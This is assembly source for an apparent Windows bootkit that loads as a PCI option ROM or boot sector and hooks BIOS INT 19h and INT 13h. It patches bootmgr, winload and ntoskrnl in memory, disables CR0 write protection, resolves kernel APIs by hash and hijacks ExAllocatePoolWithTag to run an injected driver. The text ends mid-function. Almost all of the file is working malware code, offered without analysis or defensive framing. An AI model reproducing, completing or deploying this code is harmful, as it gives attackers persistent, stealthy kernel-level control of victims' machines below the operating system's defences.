%include "BootHeader.inc"

[bits 16]
ROM_START:
;=================================================================================================
PCI_ROM_HEADER:
	ROM_SIG:
		%ifdef BOOT_BIOS
			_MOD_SIG	dw	0xAA55
			_MOD_LEN	db	(THE_MODULE_SIZE/0x200)
		%endif
		
		%ifdef BOOT_FLOPPY
			jmp	CODE_START
		%endif
		
	ROM_ENTRY:
			jmp CODE_START
			db	0
	ROM_RSVD:
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db	0
			db  0
		%ifdef _PCI_MODULE_
			dw _PCI_STRUCTURE			;PCI structure offset
		%endif
		%ifdef _ISA_MODULE_
			db	0
			db	0
		%endif
			db	0
	EXPANSION_HEADER:
		dw	0
		%ifdef _PCI_MODULE_
			_PCI_STRUCTURE:
		    dd 52494350h
			dd 12341917h
			dd 180000h
			dd 600h
			dd 2Ah
			dd 0
		%endif

OrigalInt0x13		EQU			(ROM_START + 0x00)		;dd
OrigalInt0x19		EQU			(ROM_START + 0x04)		;dd
Function_Number		EQU			(ROM_START + 0x08)		;db
SectorCount			EQU			(ROM_START + 0x09)		;db
SystemType			EQU			(ROM_START + 0x0A)
MarcoBootCodeAddr	EQU			(ROM_START + 0x0C)
HookedAddress		EQU			(ROM_START + 0x10)		;dd
HookedAddress_Ex	EQU			(ROM_START + 0x14)		;dd
CodeBase			EQU			(ROM_START + 0x18)
TailHookedAddr		EQU			(ROM_START + 0x1C)
NtoskrnlEntry		EQU			(ROM_START + 0x20)
LoaderParamBlock	EQU			(ROM_START + 0x24)
BlImgAllocImageBuf	EQU			(ROM_START + 0x28)
BlImgAllocImgOffset	EQU			(ROM_START + 0x2C)
KernelMemory		EQU			(ROM_START + 0x30)
Win732BitsEntry		EQU			(ROM_START + 0x34)

Origal_ExAllocatePoolWithTag		EQU			(ROM_START + 0x38)
Origal_ExFreePoolWithTag			EQU			(ROM_START + 0x3C)
Origal_IoCreateDriver				EQU			(ROM_START + 0x40)
Origal_PsGetCurrentThreadProcessId	EQU			(ROM_START + 0x44)
Origal_MmMapIoSpace					EQU			(ROM_START + 0x48)
Origal_PsSetLoadImageNotifyRoutine	EQU			(ROM_START + 0x4C)

DriverBase		EQU		(ROM_START + 0x50)
DriverLength	EQU		(ROM_START + 0x54)
DriverLoadAddr	EQU		(ROM_START + 0x58)
DriverLoadLen	EQU		(ROM_START + 0x5C)
HookFlag		EQU		(ROM_START + 0x60)
NtOsKrnlBase	EQU		(ROM_START + 0x64)
IoInitSystem	EQU		(ROM_START + 0x68)
CICheckAddr		EQU		(ROM_START + 0x7C)
BlAllocAlignDes	EQU		(ROM_START + 0x80)
BlAllocAlOffset	EQU		(ROM_START + 0x84)

CODE_START:

%ifdef BOOT_FLOPPY

xor ax,ax
mov ah,0x48
mov bx,0x8000
int 21h

mov ah,0x35
mov al,0x13
int 21h

mov bx,0x7e0
mov es,bx		
xor bx,bx		;read to es:bx == 0x7e00
mov ax,0x0211	;ah=2 - read sectors, al - sectors num
xor dx,dx
mov cx,0x0002	;sector from Harddisk boot
int 0x13

%endif

%ifdef RELEASE_ISA_ROM
mov al,_MOD_LEN
xor bl,bl
%endif

RsvdMem_start:
xor ax,ax
mov ds,ax
mov es,ax
mov ax,word [0x0413]
sub ax,(THE_MODULE_SIZE/0x400)
mov word [0x0413],ax
shl ax,6
mov es,ax
RsvdMem_end:
MoveCodeStart:
call MoveCode
MoveCode:
	IP_OFFSET equ (MoveCode - ROM_START)
%ifdef BOOT_BIOS
MOD_LEN_OFFSET		equ		(MoveCode - _MOD_LEN)
%endif
pop si

%ifdef BOOT_BIOS
push si
mov di,si
sub si,MOD_LEN_OFFSET
mov al,byte [cs:si]
mov byte [cs:si],0
add di,CRC_OFFSET
mov ah,byte [cs:di]
add ah,al
mov byte [cs:di],ah
pop si
%endif

xor di,di
mov ax,cs
mov ds,ax
sub si,IP_OFFSET
mov cx,THE_MODULE_SIZE
cld
rep movsb
mov word [es:MarcoBootCodeAddr],es
mov word [es:CodeBase],es
push es
push REAL_CODE_OFFSET
retf
REAL_CODE_START:
REAL_CODE_OFFSET equ (REAL_CODE_START - ROM_START)
save_env:
xor eax,eax
mov ax,cs
mov ds,ax
mov es,ax
mov word [cs:MarcoBootCodeAddr],ax
shl eax,4
mov edx,eax

%ifdef BOOT_FLOPPY
xor ax,ax
mov es,ax
mov ax,0x0201
mov dx,0x0080
mov cx,1
mov bx,0x7c00
int 0x13
%endif

%ifdef BOOT_FLOPPY
xor ax,ax
mov es,ax
mov eax,[es:0x13 * 4]
mov dword[cs:OrigalInt0x13],eax
mov [es:0x13 * 4],word (HookedInt0x13 - ROM_START)
mov [es:0x13 * 4 + 2],cs
%endif
;=======================================================================================================
%ifdef BOOT_BIOS
InstallInt0x19:
xor ax,ax
mov es,ax
mov eax,dword [es:0x64]
mov dword[cs:OrigalInt0x19],eax
mov word [es:0x64],(HookedInt0x19 - ROM_START)
mov word [es:0x64 + 2],cs
%endif

%ifdef BOOT_FLOPPY
jmp word 0x00:0x7c00
%endif
%ifdef BOOT_BIOS
xor ax,ax
retf
%endif
%ifdef BOOT_FLOPPY
DATA_EXT_START:
	times 510-($-$$) db 0
DATA_EXT_END:
	dw 0xaa55
%endif
HookedInt0x19:
pushf
pusha
xor ax,ax
mov es,ax
mov eax,dword [cs:OrigalInt0x19]
mov dword [es:0x64],eax

mov eax,dword [es:(0x13 * 4)]
mov dword [cs:OrigalInt0x13],eax
mov word [es:(0x13 * 4)],(HookedInt0x13 - ROM_START)
mov word [es:(0x13 * 4 + 2)],cs
popa
popf
jmp far word [cs:OrigalInt0x19]
jmp $

HookedInt0x13:
pushf
or dl,dl
jns HookedInt0x13_Jmp
cmp dl,0
jnz HookedInt0x13_Check_DL
inc dl
HookedInt0x13_Check_DL:
cli
cmp ah,0x42
je Process_Read_Action
cmp ah,0x02
je Process_Read_Action
HookedInt0x13_Jmp:
popf
jmp far word[cs:OrigalInt0x13]
Process_Read_Action:
mov byte [cs:Function_Number], ah
HookedInt0x13_Read:
call far word[cs:OrigalInt0x13]
jb HookedInt0x13_Exit
push ds
push es
pushad
pushf
mov di,bx
mov ah, byte [cs:Function_Number]
cmp ah,0x02
jz Process_Read_Function_2
mov al,[si + 0x02]
les di,[si + 0x04]
Process_Read_Function_2:
test al,al
jz HookedInt0x13_Return
xor ebx,ebx
mov bl,al
shl bx,9
cld
xor esi,esi
push cs
pop si
shl esi,0x04
add si,di
jo HookedInt0x13_Return
push cs
pop ds
Reload_Hex_Code:
test bx,bx
jz HookedInt0x13_Return
inc di
dec bx
xor cx,cx
dec cx
mov si,SERACH_SIGNATURE - ROM_START
Scan_Loop:
inc cx
lodsd
test eax,eax
jz Reload_Hex_Code
cmp bx,8
jbe HookedInt0x13_Return
push eax
push ebx
xor eax,eax
mov ax,es
mov bx,di
shr bx,4
add ax,bx
mov es,ax
and di,0x0F
pop ebx
pop eax
cmp dword [es:di],eax
jnz Find_Search_Code_Next
lodsd
test eax,eax
jz Find_Scan_Code
cmp dword [es:di + 0x04],eax
jnz Scan_Loop
jmp Find_Scan_Code
Find_Search_Code_Next:
add esi,0x04
jmp Scan_Loop

Find_Scan_Code:
jmp Continue_Find
jmp HookedInt0x13_Return
Continue_Find:

; push es
; xor ax,ax
; mov es,ax
; mov eax,[es:0x15 * 4]
; mov dword [cs:OrigalInt0x15],eax
; mov [es:0x15 * 4],word (HookedInt0x15 - ROM_START)
; mov [es:0x15 * 4 + 2],cs
; pop es

xor eax,eax
mov ax,cs
shl eax,0x04
push eax
push ebx
mov bx,es
shl ebx,0x04
add ebx,edi
mov dword [cs:HookedAddress],ebx
pop ebx
pop eax
;add eax,HOOK_DATA_INFO_START - ROM_START
add eax,Hooked_Su_Start - ROM_START
;test cl,cl
;jz Check_Ecx_Six

;push ecx
; GetHookCode:
; add eax,0x28
; loop GetHookCode
; pop ecx
; Check_Ecx_NINE:
; cmp ecx,0x09
; jnz Check_Ecx_Six
; cmp byte [es:di + 0x04],0xE8
; jnz Check_Ecx_Six
; pushad
; pushfd
; lea eax,[es:di]
; add eax,0x04
; mov dword [cs:BlAllocAlignDes],eax

; lea ebx,[cs:Fix_BlAllocateAlignedDescriptor_Start]
; push eax
; mov eax,dword [eax]
; mov dword [ebx],eax
; pop eax
; mov cl,byte [eax + 0x04]
; mov byte [ebx + 0x04],cl

; lea edx,[cs:HookedExAllocatePoolWithTag_START]
; sub edx,eax
; sub edx,0x05
; mov byte [eax],0xE8
; mov dword [eax + 0x01],edx

; popfd
; popad
push es
push 0x00
pop es
push eax
mov eax,dword [cs:OrigalInt0x13]
cli
mov dword [es:0x13 * 4],eax
sti
pop eax
pop es
Check_Ecx_Six:
cmp ecx,0x06
jnz Check_Ecx_Eight
add di,0x0b
push edx
mov edx,[es:di + 0x03]
mov dword [cs:SaveOrigal_1],edx
pop edx
jmp No_Find_Ecx
Check_Ecx_Eight:
cmp ecx,0x08
jnz Check_Ecx_Seven
mov byte [es:di + 0x06],0x00
jmp Jmp_Reload
Check_Ecx_Seven:
cmp ecx,0x07
jnz Check_Ecx_Four
push cx
push di
push ax
mov cx,0x0F
mov al,0x90
rep stosb
pop ax
pop di
pop cx
jmp Jmp_Reload
Check_Ecx_Four:
cmp ecx,0x04
jnz No_Find_Ecx
pushad
pushf
push es
push ds
push es
pop ds
mov si,di
push cs
pop es
mov di,Fixed_Hooked_Su_X86_Start
mov cx,Fixed_Hooked_Su_X86_End - Fixed_Hooked_Su_X86_Start
rep movsb
pop ds
pop es
popf
popad
mov dword [es:di],0x206A66
mov byte [es:di + 0x03],0x66
mov byte [es:di + 0x04],0x68

mov [es:di + 0x05],eax
mov word [es:di + 0x09],0xCB66
;push edi
;push eax
;push ecx
;push es
;push cs
;pop es
;mov ecx,0x0e
;mov di,0x23A
;mov al,0x90
;rep stosb
;pop es
;pop ecx
;pop eax
;pop edi
jmp Jmp_Reload
No_Find_Ecx:
; xor eax,eax
; mov ax,cs
; shl eax,0x04
; cmp dword [es:di],0x196A006A
; jnz No_Find_Start_Hook
; cmp byte [es:di + 0x04],0xE8
; jnz Jmp_Reload

; pushad
; pushfd
; push edi
; mov edx,eax
; xor eax,eax
; mov ax,es
; and eax,0x0000ffff
; shl eax,0x04
; and edi,0x0000ffff
; add eax,edi
; add eax,0x04
; mov dword [cs:BlAllocAlignDes],eax
; pop edi

; push ds
; push si

; push es
; pop ds

; push di
; pop si
; add si,0x04
; push es
; push di

; push cs
; pop es
; mov di,Fix_BlAllocateAlignedDescriptor_Start
; mov cx,0x05
; rep movsb

; pop di
; pop es

; pop si
; pop ds

; popfd
; popad
; add eax,Hooked_BlAllocateAlignedDescriptor_Start - ROM_START
; mov byte [es:di + 0x04 + 0x05],0xC3
; mov byte [es:di + 0x04],0x68
; mov dword [es:di + 0x04 + 0x01],eax
; jmp Jmp_Reload
No_Find_Start_Hook:
xor eax,eax
mov ax,cs
shl eax,0x04
add eax,x86_Hooked_Xp_Call_Start - ROM_START
mov byte [es:di + 0x05],0xC3
mov byte [es:di],0x68
mov dword [es:di + 0x01],eax
Jmp_Reload:
jmp Reload_Hex_Code
HookedInt0x13_Return:
popf
popad
pop es
pop ds
HookedInt0x13_Exit:
retf 2
Floppy_CodeEnd:
;==============================================================================================================================
;CodeBase	dd	0x00000000
USE32
X86_Code_Start:

x86_Hooked_Xp_Call_Start:
pushfd
pushad
mov esi,[ebp - 0x0D10]
call x86_Find_Ntoskrnl_Hook_Start
popad
popfd
call [ebp -0x0D10]
x86_Hooked_Xp_Call_Start_Ret:
jmp x86_Hooked_Xp_Call_Start_Ret
x86_Hooked_Xp_Call_End:

HookedXpFindNtoskrnlBaseStart:
pushfd
pushad
mov esi,dword [ebp - 0xD10]
mov ebx,esi
mov ecx,0x74d704
Scan_Loop_Xp_Ntoskrnl_Base:
cmp dword [esi],0x00905A4D
jz Finder_Xp_Ntoskrnl_Base
dec esi
loop Scan_Loop_Xp_Ntoskrnl_Base
jmp HookXpFindNtoskrnlBaseReturn
Finder_Xp_Ntoskrnl_Base:

call CurrentCodeHookedXpFindNtoskrnlBase
CurrentCodeHookedXpFindNtoskrnlBase:
	BASE_OFFSET_HOOKED_XP_FIND_NTOSKRNL_BASE equ (CurrentCodeHookedXpFindNtoskrnlBase - X86_Code_Start)
pop ebp
sub ebp,(BASE_OFFSET_HOOKED_XP_FIND_NTOSKRNL_BASE + 0x04)
mov ebp,[ebp]
and ebp,0x0000ffff
shl ebp,0x04

mov dword [ebp + NtoskrnlEntry],ebx
mov ebx,dword [esi + 0x3C]
add ebx,esi
;call GetKernelExportApi_XP_Start
mov edi,dword [ebx + 0xA0]
add edi,esi
mov edx,dword [ebx + 0xA4]
test edx,edx
jz HookXpFindNtoskrnlBaseReturn

mov dword [ebp + NtOsKrnlBase],esi
mov dword [ebp + HookFlag],0x00000000
mov edi,ebp
add edi,HookedXpFindNtoskrnlBaseEnd
mov esi,dword [ebp + NtoskrnlEntry]
mov ecx,0x05
rep movsb

mov eax,cr0
and eax,0xFFFEFFFF
mov cr0,eax

mov ecx,dword [ebp + NtoskrnlEntry]
mov byte [ecx],0xE8
lea edi,[ebp + Hooked_Xp_Ntoskrnl_Start]
sub edi,ecx
sub edi,0x05
mov dword [ecx + 0x01],edi

mov eax,cr0
or eax,0x10000
mov cr0,eax
HookXpFindNtoskrnlBaseReturn:
popad
popfd
call dword [ebp - 0xD10]
Ntoskrnl_While:
jmp Ntoskrnl_While
HookedXpFindNtoskrnlBaseEnd:
nop
nop
nop
nop
nop
Hooked_Xp_Ntoskrnl_Start:
;================================================================================================================================
;X86 X64 Code
Hooked_Su_Start:
pushfd
pushad
call HookedSuCurEip
HookedSuCurEip:
	BASE_OFFSET equ (HookedSuCurEip - ROM_START)
	
pop ebp
mov edx,ebp
sub ebp,BASE_OFFSET
;mov ebp,[ebp + CodeBase]
;and ebp,0x0000ffff
;shl ebp,0x04
;mov edx,ebp
;cli
;push es
;mov eax,[ebp + OrigalInt0x13]
;mov dword [es:0x4C],eax
;pop es
;sti
xor edx,edx
mov edi,dword [ebp + HookedAddress]
lea esi,[ebp + Fixed_Hooked_Su_X86_Start]
mov ecx,Fixed_Hooked_Su_X86_End - Fixed_Hooked_Su_X86_Start
rep movsb

mov ecx,0x9b000
mov eax,ebx
Scan_Loop_Archx86TransferTo32BitApplicationAsm:
cmp dword [eax],0x8b5bd0ff
jz Find_Success_X86
inc eax
loop Scan_Loop_Archx86TransferTo32BitApplicationAsm
jmp Scan_Loop_Archx86TransferTo64BitApplicationAsm
Find_Success_X86:
cld
mov dword [ebp + HookedAddress],eax
Hooked_Success_X64:
mov esi,eax
lea edi,[ebp + x86_Fixed_Hook_BootMgr_Start]
mov ecx,x86_Fixed_Hook_BootMgr_End - x86_Fixed_Hook_BootMgr_Start
rep movsb

lea edi,[ebp + x86_Hook_BootMgr_Start]
mov byte [eax],0xE8
sub edi,eax
sub edi,5
mov dword [eax + 1],edi
test edx,edx
jnz Hooked_Su_Return
Scan_Loop_Archx86TransferTo64BitApplicationAsm:
mov ecx,0x9b000
mov ebx,eax
Continue_Find_X64:
cmp dword [eax],0xEA00EBC0
jz Find_Success_X64
inc eax
loop Continue_Find_X64
jmp Hooked_Su_Return
Find_Success_X64:
add eax,3
mov dword [ebp + HookedAddress_Ex],eax
inc edx
mov esi,eax
lea edi,[ebp + Fixed_Hooked_Su_X64_Start]
mov ecx,Fixed_Hooked_Su_X64_End - Fixed_Hooked_Su_X64_Start
rep movsb

lea edi,[ebp + x64_Hook_BootMgr_Start]
mov byte [eax],0xE8
sub edi,eax
sub edi,5
mov dword [eax + 1],edi

;mov dword [ebp + BASE_OFFSET + 0x2F],Fixed_Hooked_Su_X64_Start
;mov dword [ebp + BASE_OFFSET + 0x3C],x64_Hook_BootMgr_Start
;jmp Hooked_Success_X64
Hooked_Su_Return:
popad
popfd
jmp ebx
Hooked_Su_End:
Fixed_Hooked_Su_X86_Start:
dd 0x00000000
dd 0x00000000
dd 0x00000000
Fixed_Hooked_Su_X86_End:
;================================================================================================================================
;X86 Hook BootMgr.exe
x86_Hook_BootMgr_Start:
pushf
pushad
call HookedBootMgrCurEip
HookedBootMgrCurEip:
	BASE_OFFSET_HOOK_BOOTMGR equ (HookedBootMgrCurEip - ROM_START)
	
pop ebp
sub ebp,BASE_OFFSET_HOOK_BOOTMGR
;mov ebp,[ebp]
;and ebp,0x0000ffff
;shl ebp,0x04
cld
;mov edi,[esp + 0x24]
;sub edi,5
mov edi,dword [ebp + HookedAddress]
;mov edi,dword [edi]
lea esi,[ebp + x86_Fixed_Hook_BootMgr_Start]
mov ecx,x86_Fixed_Hook_BootMgr_End - x86_Fixed_Hook_BootMgr_Start
rep movsb
mov ecx,0x102068
Find_Winload_OslArchTransferToKernel:
cmp dword [eax],0x5251D233
jz Find_OslArchTransferToKernel_Success
inc eax
loop Find_Winload_OslArchTransferToKernel
jmp x86_Hook_BootMgr_RETURN
Find_OslArchTransferToKernel_Success:
mov dword [ebp + HookedAddress],eax
mov esi,eax
lea edi,[ebp + x86_Fixed_Hook_Winload_Start]
mov ecx,x86_Fixed_Hook_Winload_End - x86_Fixed_Hook_Winload_Start
rep movsb
lea edi,[ebp + x86_Hook_Winload_Start]
mov byte [eax],0xE8
sub edi,eax
sub edi,5
mov dword [eax + 1],edi
x86_Hook_BootMgr_RETURN:
popad
popfd
sub dword [esp],5
retn
x86_Hook_BootMgr_End:
x86_Fixed_Hook_BootMgr_Start:
db 0x00
dd 0x00000000
x86_Fixed_Hook_BootMgr_End:

x86_Hook_Winload_Start:
pushfd
pushad
mov esi,eax
call x86_Find_Ntoskrnl_Hook_Start 
popad
popfd
xor edx,edx
push ecx
push edx
push 8
push eax
retf
x86_Hook_Winload_End:
x86_Fixed_Hook_Winload_Start:
db 0x00
dd 0x00000000
x86_Fixed_Hook_Winload_End:

x86_Find_Ntoskrnl_Hook_Start:
mov ecx,0x74d704
Serach_Ntoskrnl_Pe:
cmp dword [esi],0x00905A4D
jz Find_Ntoskrnl_Pe
dec esi
loop Serach_Ntoskrnl_Pe
jmp x86_Find_Ntoskrnl_Hook_Return
Find_Ntoskrnl_Pe:
mov ebx,[esi + 0x3C]
add ebx,esi
call x86_Serach_Ntoskrnl_Export_Start
mov edi,[ebx + 0xA0]
add edi,esi
mov edx,[ebx + 0xA4]
test edx,edx
jz x86_Find_Ntoskrnl_Hook_Return
cld
call x86_Find_Ntoskrnl_Hook_Cur_Eip
x86_Find_Ntoskrnl_Hook_Cur_Eip:
	BASE_OFFSET_HOOK_x86_Find_Ntoskrnl_Hook equ (x86_Find_Ntoskrnl_Hook_Cur_Eip - ROM_START)
pop ebp
sub ebp,BASE_OFFSET_HOOK_x86_Find_Ntoskrnl_Hook
push esi
push edi
push ecx
lea esi,[ebp + x86_Fixed_Hook_Winload_Start]
mov edi,[ebp + HookedAddress]
mov ecx,x86_Fixed_Hook_Winload_End - x86_Fixed_Hook_Winload_Start
rep movsb
pop ecx
pop edi
pop esi
mov eax,esi
add eax,0x40
push edi
mov esi,[ebp + x86_ExAllocatePoolWithTag]
push esi
lea edi,[ebp + x86_Fixed_Hook_ExAllocatePoolWithTag_Start]
mov ecx,x86_Fixed_Hook_ExAllocatePoolWithTag_End - x86_Fixed_Hook_ExAllocatePoolWithTag_Start
rep movsb
pop esi
;mov esi,[ebp + x86_PsSetLoadImageNotifyRoutine]
;lea edi,[ebp + x86_Fixed_Hook_PsSetLoadImageNotifyRoutine_Start]
;mov ecx,x86_Fixed_Hook_PsSetLoadImageNotifyRoutine_End - x86_Fixed_Hook_PsSetLoadImageNotifyRoutine_Start
;rep movsb
lea edi,[ebp + x86_MmMapDatAddress]
lea eax,[ebp + x86_Map_Dat_Start]
mov [edi],eax
mov ecx,x86_Map_Dat_End - x86_Map_Dat_Start
mov [edi + 0x04],ecx
pop edi
push edi
lea esi,[ebp + x86_Hook_ExAllocatePoolWithTag_Start]
mov ecx,x86_Hook_ExAllocatePoolWithTag_End - x86_Hook_ExAllocatePoolWithTag_Start
rep movsb
pop edi
mov eax,[ebp + x86_ExAllocatePoolWithTag]
mov byte [eax],0xE8
sub edi,eax
sub edi,0x05
mov dword [eax + 0x01],edi
x86_Find_Ntoskrnl_Hook_Return:
retn
x86_Find_Ntoskrnl_Hook_End:
;x86_Fixed_Hook_PsSetLoadImageNotifyRoutine_Start:
;times 0x120 db 0
;x86_Fixed_Hook_PsSetLoadImageNotifyRoutine_End:
x86_Serach_Ntoskrnl_Export_Start:
pushad
mov edx,[ebx + 0x78]
add edx,esi
xor ebx,ebx
mov ecx,[edx + 0x20]
add ecx,esi
mov eax,[edx + 0x1C]
add eax,esi
mov edi,[edx + 0x18]
mov ebp,[edx + 0x24]
add ebp,esi
Serach_Api_Name_Hash:
mov edx,[ecx]
add edx,esi
push eax
push ebx
mov bx,[ebp + ebx * 2 + 0x00]
and ebx,0xFFFF
mov eax,[eax + ebx * 0x04]
add eax,esi
call x86_Check_Hash_Value_Start
pop ebx
pop eax
add ecx,0x04
inc ebx
dec edi
jnz Serach_Api_Name_Hash
popad
retn
x86_Serach_Ntoskrnl_Export_End:

x86_Check_Hash_Value_Start:
pushad
mov ebx,eax
call x86_Calc_Hash_Value_Start
mov edx,eax
call x86_Check_Hash_Value_CurEip
x86_Check_Hash_Value_CurEip:
	BASE_OFFSET_HOOK_x86_Check_Hash_Value equ (x86_Check_Hash_Value_CurEip - ROM_START)
pop ebp
sub ebp,BASE_OFFSET_HOOK_x86_Check_Hash_Value
lea esi,[ebp + x86_Copy_Code_Api_Hash_Value]
lea edi,[ebp + x86_Copy_Code_Api_Save_Address]
x86_Check_Hash_Value_Cmp:
add edi,0x04
lodsd
test eax,eax
jz x86_Check_Hash_Value_Return
cmp eax,edx
jnz x86_Check_Hash_Value_Cmp
mov [edi],ebx
x86_Check_Hash_Value_Return:
popad
retn
x86_Check_Hash_Value_End:

x86_Calc_Hash_Value_Start:
push ecx
push ebx
push edx
xor ecx,ecx
xor eax,eax
xor ebx,ebx
inc eax
Hash_Value_Calc:
mov cl,byte [edx]
test cl,cl
jz Hash_Value_Return
add eax,ecx
add ebx,eax
inc edx
jmp Hash_Value_Calc
Hash_Value_Return:
shl ebx,0x10
or eax,ebx
pop edx
pop ebx
pop ecx
retn
x86_Calc_Hash_Value_End:

x86_Hook_ExAllocatePoolWithTag_Start:
pushfd
pushad
call x86_Hook_ExAllocatePoolWithTag_CurEip
x86_Hook_ExAllocatePoolWithTag_CurEip:
	BASE_OFFSET_HOOK_Hook_ExAllocatePoolWithTag equ (x86_Fixed_Hook_ExAllocatePoolWithTag_Start - x86_Hook_ExAllocatePoolWithTag_CurEip)
pop ebp
;add ebp,BASE_OFFSET_HOOK_Hook_ExAllocatePoolWithTag

cld
mov edx,cr0
and edx,0xFFFEFFFF
mov cr0,edx

mov edi,[esp + 0x24]
sub edi,0x05
lea esi,[ebp + BASE_OFFSET_HOOK_Hook_ExAllocatePoolWithTag]
mov ecx,x86_Fixed_Hook_ExAllocatePoolWithTag_End - x86_Fixed_Hook_ExAllocatePoolWithTag_Start
rep movsb

mov edx,cr0
or edx,0x10000
mov cr0,edx

call [ebp + x86_PsGetCurrentProcessId - x86_Hook_ExAllocatePoolWithTag_CurEip]
test eax,eax
jz x86_Continue_Hook_ExAllocatePoolWithTag
call x86_Hook_ExAllocatePoolWithTag_CurEip_MmMapIoSpace
x86_Hook_ExAllocatePoolWithTag_CurEip_MmMapIoSpace:
	BASE_OFFSET_HOOK_Hook_ExAllocatePoolWithTag_MmMapIoSpace equ (x86_Hook_ExAllocatePoolWithTag_CurEip_MmMapIoSpace - x86_Hook_ExAllocatePoolWithTag_Start)
pop ebp
sub ebp,BASE_OFFSET_HOOK_Hook_ExAllocatePoolWithTag_MmMapIoSpace
push 0x00000000
push dword [ebp + x86_MmMapDatSize - x86_Hook_ExAllocatePoolWithTag_Start];MmMapIoSpace size
push 0x00000000;High address
push dword [ebp + x86_MmMapDatAddress - x86_Hook_ExAllocatePoolWithTag_Start];Low address
call [ebp + x86_MmMapIoSpace - x86_Hook_ExAllocatePoolWithTag_Start]
test eax,eax
jz x86_Hook_ExAllocatePoolWithTag_Return
xor ecx,ecx
x86_Hook_ExAllocatePoolWithTag_Continue:
inc ecx
cmp ecx,dword [ebp + x86_MmMapDatSize - x86_Hook_ExAllocatePoolWithTag_Start];MmMapIoSpace size
jnb x86_Hook_ExAllocatePoolWithTag_Return
cmp dword [eax + ecx],0x40404040
jnz x86_Hook_ExAllocatePoolWithTag_Continue
;push dword [ebp + x86_MmMapDatSize - x86_Hook_ExAllocatePoolWithTag_Start]
push eax
push dword [ebp + x86_ExAllocatePoolWithTag - x86_Hook_ExAllocatePoolWithTag_Start]
lea edi,[eax + ecx + 0x04]
call edi
x86_Hook_ExAllocatePoolWithTag_Return:
popad
popfd
sub dword [esp],0x05
retn
x86_Continue_Hook_ExAllocatePoolWithTag:
lea ebx,[esp + 0x28]
push dword [ebx + 0x0C]
push dword [ebx + 0x08]
push dword [ebx + 0x04]
call dword [ebp + x86_ExAllocatePoolWithTag - x86_Hook_ExAllocatePoolWithTag_CurEip]
mov [esp + 0x1C],eax
mov edx,cr0
and edx,0xFFFEFFFF
mov cr0,edx

lea edi,[ebp - 0x07]
mov eax,[ebp + x86_ExAllocatePoolWithTag - x86_Hook_ExAllocatePoolWithTag_CurEip]
mov byte [eax],0xE8
sub edi,eax
sub edi,0x05
mov dword [eax + 0x01],edi

mov edx,cr0
or edx,0x10000
mov cr0,edx
popad
popfd
add esp,0x04
retn 0x0C
x86_Fixed_Hook_ExAllocatePoolWithTag_Start:
db 0x00
dd 0x00000000
x86_Fixed_Hook_ExAllocatePoolWithTag_End:
x86_Copy_Code_Api_Hash_Value:
dd 0x91E40AB2		;PsSetLoadImageNotifyRoutine
dd 0x42A50728		;KeUpdateSystemTime
dd 0x594D0835       ;ExAllocatePoolWithTag
dd 0x5A920853		;PsGetCurrentProcessId
dd 0x1C88047D		;MmMapIoSpace
x86_Copy_Code_Api_Save_Address:
dd 0x00000000
x86_PsSetLoadImageNotifyRoutine dd 0x00000000
x86_KeUpdateSystemTime dd 0x00000000
x86_ExAllocatePoolWithTag dd 0x00000000
x86_PsGetCurrentProcessId dd 0x00000000
x86_MmMapIoSpace dd 0x00000000
x86_MmMapDatAddress dd 0x00000000
x86_MmMapDatSize dd 0x00000000
x86_Hook_ExAllocatePoolWithTag_End:
;================================================================================================================================
;x86_Map_Dat_Start:
;incbin './InjectDrvx86.sys'
;x86_Map_Dat_End:
;================================================================================================================================
;X64 Hook BootMgr.exe
x64_Hook_BootMgr_Start:
pushf
pushad
call X64_HookedBootMgrCurEip
X64_HookedBootMgrCurEip:
	X64_BASE_OFFSET_HOOK_BOOTMGR equ (X64_HookedBootMgrCurEip - ROM_START)
pop ebp
sub ebp,X64_BASE_OFFSET_HOOK_BOOTMGR
cld
mov edi,dword [ebp + HookedAddress_Ex]
lea esi,[ebp + Fixed_Hooked_Su_X64_Start]
mov ecx,Fixed_Hooked_Su_X64_End - Fixed_Hooked_Su_X64_Start
rep movsb
sub edi,0x04
mov eax,[edi]
xor ecx,ecx
Search_BootApp64EntryRoutine:
inc ecx
cmp ecx,0x27
jg X64_Hook_BootMgr_Return
cmp word [eax + ecx],0x8B48
jnz Search_BootApp64EntryRoutine
cmp byte [eax + ecx + 0x02],0x86
jnz Search_BootApp64EntryRoutine
mov eax,[eax + ecx + 0x03]
mov eax,[eax]
xor ecx,ecx
Search_OslArchTransferToKernel:
inc ecx
cmp ecx,0x158878
jg X64_Hook_BootMgr_Return
cmp dword [eax + ecx],0xCB485541
jnz Search_OslArchTransferToKernel
add eax,ecx
lea edi,[ebp + Fixed_X64_Hook_Winload_Start]
lea esi,[eax + 0x02]
mov dword [ebp + HookedAddress_Ex],esi
mov ecx,Fixed_X64_Hook_Winload_End - Fixed_X64_Hook_Winload_Start
rep movsb
lea edi,[ebp + X64_Hook_Winload_Start]
mov byte [eax + 0x02],0xE9
sub edi,eax
sub edi,0x05
mov [eax + 0x03],edi
X64_Hook_BootMgr_Return:
popad
popf
sub dword [esp],0x05
retn
x64_Hook_BootMgr_End:
Fixed_Hooked_Su_X64_Start:
db 0x00
dd 0x00000000
Fixed_Hooked_Su_X64_End:
;=================================================================================================================================
;x64 Hook Winload OslArchTransferToKernel
USE64
X64_Hook_Winload_Start:
nop
nop
pushf
push r13
push rcx
push rax
push rbp
push rdi
push rsi

call X64_Hook_Winload_CurEip
X64_Hook_Winload_CurEip:
	X64_BASE_OFFSET_HOOK_WINLOAD equ (X64_Hook_Winload_CurEip - ROM_START)
pop rbp
sub rbp,X64_BASE_OFFSET_HOOK_WINLOAD
cld
;xor rdi,rdi
;xor rsi,rsi
mov edi,dword [rbp + HookedAddress_Ex]
lea rsi,[rbp + Fixed_X64_Hook_Winload_Start]
mov rcx,Fixed_X64_Hook_Winload_End - Fixed_X64_Hook_Winload_Start
rep movsb
push rbp
xor r15,r15
cmp rax,r13
jnz IsNotFlag
mov r15,0x01
IsNotFlag:
mov rax,r13
X64_Hook_Winload_Search_PE_Header:
dec rax
cmp dword [rax],0x00905A4D
jnz X64_Hook_Winload_Search_PE_Header
call x64_Serach_Ntoskrnl_Export_Start
call x64_Set_Section_Characteristics_Start
pop rbp
mov [rbp + x64_Ntoskrnl_Base_Address],rsi
push rax
push rbx
;lea rax,[rbp + x64_FuckDrvAddress]
lea rbx,[rbp + x64_Map_Dat_Start]
;mov [rax],rbx
mov [rbp + x64_FuckDrvAddress],rbx
pop rbx
pop rax
mov r8,[rbp + x64_ExRegisterCallback]
cmp byte [r8 + 0x04],0x80
